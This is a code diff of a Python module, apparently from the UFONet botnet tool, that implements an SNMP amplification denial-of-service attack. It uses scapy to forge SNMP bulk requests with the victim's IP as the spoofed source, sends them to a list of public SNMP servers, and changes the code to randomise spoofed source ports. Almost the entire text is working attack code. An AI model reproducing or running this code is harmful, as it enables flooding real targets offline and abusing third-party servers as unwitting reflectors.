@@ -18,10 +18,18 @@ except:
 
 snmp_file = "botnet/snmp.txt" # SNMP servers IP list
 
-oid ="1.3.6.1.2.1.1.1" # OID sysDescr 
+oid ="1.3.6.1.2.1.1.1" # OID sysDescr
+
+def randInt():
+    x = random.randint(1,65535) # TCP ports
+    return x
+
+def randPort(start, end):
+    x = random.randint(start, end)
+    return x
 
 # UFONet SNMP Amplification (SNIPER) / [Port: UDP/161]
-def sniperize(ip, rounds, source=None):
+def sniperize(ip, rounds, address_dict):
     n=0
     try: # (SNMP) Amplification attack uses publically accessible SNMP servers to flood a target with SNMP response traffic
         with open(snmp_file) as f: # extract SNMP servers from file
@@ -31,13 +39,17 @@ def sniperize(ip, rounds, source=None):
         for x in range (0,int(rounds)):
             try:
                 n=n+1
-                print("[Info] [AI] [SNIPER] Breaking SNMP 'parsec' ["+str(n)+"] and remaking space-time on it! -> [SLOWING!]")
+                if address_dict['start'] is not None and address_dict['end'] is not None:
+                    s_zombie_port = randPort(int(address_dict['start']), int(address_dict['end']))
+                else:
+                    s_zombie_port = randInt()
+                # print("[Info] [AI] [SNIPER] Breaking SNMP 'parsec' ["+str(n)+"] and remaking space-time on it! -> [SLOWING!]")
                 for j in snmp_d:
                     p_num += 1
-                    packet = IP(dst=j,src=ip)/UDP(sport=random.randint(2000,65535),dport=161)/SNMP(version="v2c",community="public",PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))
+                    packet = IP(dst=j,src=ip)/UDP(sport=s_zombie_port,dport=161)/SNMP(version="v2c",community="public",PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))
                     try:
                         send(packet, verbose=0) # not using sr1 because non-replies are required
-                        print(("[Info] [AI] [SNIPER] Broken SNMP 'parsec' [{}]".format(p_num))+" IS INTERACTING WITH ["+str(j)+"] -> [AMPLIFYING!]")
+                        # print(("[Info] [AI] [SNIPER] Broken SNMP 'parsec' [{}]".format(p_num))+" IS INTERACTING WITH ["+str(j)+"] -> [AMPLIFYING!]")
                     except:
                         print(("[Info] [AI] [SNIPER] Broken SNMP 'parsec' [{}]".format(p_num))+" HAS FAILED to interact with ["+str(j)+"] -> [PASSING!]")
             except:
@@ -46,7 +58,7 @@ def sniperize(ip, rounds, source=None):
         print("[Error] [AI] [SNIPER] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class SNIPER(object):
-    def attacking(self, target, rounds, source=None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] SNMP Amplification (SNIPER) is ready to broke: [" , rounds, "parsecs ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -68,4 +80,4 @@ class SNIPER(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [SNIPER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        sniperize(ip, rounds, source) # attack with SNIPER using threading
+        sniperize(ip, rounds, address_dict) # attack with SNIPER using threading
